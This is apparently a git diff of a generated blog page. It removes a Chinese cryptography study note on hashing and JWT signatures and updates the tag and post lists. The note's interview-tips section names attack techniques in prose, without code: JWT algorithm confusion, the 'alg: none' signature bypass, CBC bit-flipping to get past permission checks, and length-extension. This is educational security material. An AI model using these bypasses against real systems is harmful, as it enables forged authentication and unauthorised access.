-<li><strong>概念</strong>：将任意长度的数据映射为固定长度的散列值。<strong>单向、不可逆</strong>，主要用于数据完整性校验、密码存储和数字签名。</li>
-<li><strong>MD5 (Message Digest Algorithm 5)<strong>：输出 128 位哈希值，已被证明存在严重的哈希碰撞漏洞，</strong>不再安全</strong>。</li>
-<li>**SHA-256 (Secure Hash Algorithm 256)**：输出 256 位哈希值，目前广泛使用，安全性较高。</li>
-</ul>
-<h2 id="四、-令牌与认证机制：JWT-JSON-Web-Token"><a href="#四、-令牌与认证机制：JWT-JSON-Web-Token" class="headerlink" title="四、 令牌与认证机制：JWT (JSON Web Token)"></a>四、 令牌与认证机制：JWT (JSON Web Token)</h2><h3 id="1-JWT-基础"><a href="#1-JWT-基础" class="headerlink" title="1. JWT 基础"></a>1. JWT 基础</h3><ul>
-<li><strong>特点</strong>：JWT 由 Header、Payload、Signature 三部分组成。中间用 <code>.</code> 隔开。</li>
-<li><strong>编码方式</strong>：使用 <strong>Base64URL</strong> 编码。<blockquote>
-<p>JWT 使用的是 Base64URL（对 Base64 做了 <code>+</code> 变 <code>-</code>、<code>/</code> 变 <code>_</code>、去掉 <code>=</code> 的变种），而非标准 Base64。</p>
-</blockquote>
-</li>
-<li><strong>安全性核心</strong>：JWT 的明文部分（Header 和 Payload）可以被任何人解码看到，所以<strong>绝对不能存放敏感信息</strong>。其安全性<strong>完全依赖于签名（Signature）</strong>，攻击者如果篡改了数据，签名校验就会失败。</li>
-</ul>
-<h3 id="2-签名算法（Signature-Algorithms）"><a href="#2-签名算法（Signature-Algorithms）" class="headerlink" title="2. 签名算法（Signature Algorithms）"></a>2. 签名算法（Signature Algorithms）</h3><p>JWT 签名主要有两类，原理完全不同：</p>
-<ul>
-<li>**HMAC-SHA256 (HS256)**：<ul>
-<li>属于<strong>对称加密</strong>思想。</li>
-<li>服务器和客户端<strong>共享一个 Secret</strong>（密钥）。</li>
-<li>服务端使用这个 Secret 对 Header+Payload 进行哈希计算生成签名。</li>
-<li><em>安全风险</em>：如果 Secret 泄露，攻击者可以伪造任意 JWT。</li>
-</ul>
-</li>
-<li>**RSA (RS256)**：<ul>
-<li>属于<strong>非对称加密</strong>思想。</li>
-<li>服务端持有<strong>私钥（Private Key）</strong>，用来生成签名（加密哈希值）；客户端或验证方持有<strong>公钥（Public Key）</strong>，用来验证签名。</li>
-<li><strong>不需要共享 Secret</strong>。</li>
-<li><em>安全风险</em>：如果服务端配置不当，允许 HS256 和 RS256 混淆，攻击者可以利用公钥当作 HMAC 的 Secret 进行伪造（著名的 JWT 算法混淆攻击）。</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="💡-安全面试常见考点提示"><a href="#💡-安全面试常见考点提示" class="headerlink" title="💡 安全面试常见考点提示"></a>💡 安全面试常见考点提示</h2><ol>
-<li><strong>JWT 的 <code>alg</code> 字段</strong>：常用来指定签名算法，如果后端没有强制校验算法，攻击者可以改成 <code>none</code> 绕过签名。</li>
-<li><strong>CBC 字节翻转</strong>：在 CBC 模式中，如果攻击者控制了 IV 和密文，修改前一块密文会影响到后一块明文的解密结果（XOR特性），常用于绕过权限验证。</li>
-<li><strong>MD5 长度扩展攻击</strong>：MD5、SHA1 等基于 Merkle–Damgård 结构的哈希函数存在长度扩展攻击风险。</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2026/10/13/%E5%85%B3%E4%BA%8E%E5%AF%86%E7%A0%81%E5%AD%A6/" data-id="cmv813a2h000h3spf3i3vfeqo" data-title="关于密码学" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/10/13/%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="cmvd7vmy4000o68pf1fu1aa5x" data-title="关于渗透测试" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -615,7 +766,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/10/11/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" data-id="cmv813a2d00093spf8d1h6mnx" data-title="MoeCTF 2026「熊出没」题解复盘" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/10/11/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" data-id="cmvd7vmy4000p68pfdemn1onj" data-title="MoeCTF 2026「熊出没」题解复盘" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -668,7 +819,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/09/26/hello-world/" data-id="cmv813a2g000f3spfa7b20dgq" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/09/26/hello-world/" data-id="cmvd7vmy3000m68pfcynjhzui" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -690,7 +841,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Categories</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/Web/">Web</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li></ul>
     </div>
   </div>
 
@@ -700,7 +851,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98/" rel="tag">复盘</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flask/" rel="tag">Flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jinja2/" rel="tag">Jinja2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session%E4%BC%AA%E9%80%A0/" rel="tag">Session伪造</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98/" rel="tag">复盘</a></li></ul>
     </div>
   </div>
 
@@ -710,7 +861,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Web安全</a> <a href="/tags/%E5%A4%8D%E7%9B%98/" style="font-size: 10px;">复盘</a>
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Flask/" style="font-size: 10px;">Flask</a> <a href="/tags/Jinja2/" style="font-size: 10px;">Jinja2</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/Session%E4%BC%AA%E9%80%A0/" style="font-size: 10px;">Session伪造</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Web安全</a> <a href="/tags/%E5%A4%8D%E7%9B%98/" style="font-size: 10px;">复盘</a>
     </div>
   </div>
 
@@ -732,11 +883,11 @@
       <ul>
         
           <li>
-            <a href="/2026/10/14/moectf%E5%A4%8D%E7%9B%98/">moectf复盘</a>
+            <a href="/2026/10/18/moectf-ssti-writeup/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2026/10/13/%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">关于渗透测试</a>
+            <a href="/2026/10/14/moectf%E5%A4%8D%E7%9B%98/">moectf复盘</a>
           </li>
         
           <li>
@@ -744,11 +895,11 @@
           </li>
         
           <li>
-            <a href="/2026/10/11/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">MoeCTF 2026「熊出没」题解复盘</a>
+            <a href="/2026/10/13/%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">关于渗透测试</a>
           </li>
         
           <li>
-            <a href="/2026/09/26/hello-world/">Hello World</a>
+            <a href="/2026/10/11/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">MoeCTF 2026「熊出没」题解复盘</a>
           </li>
         
       </ul>
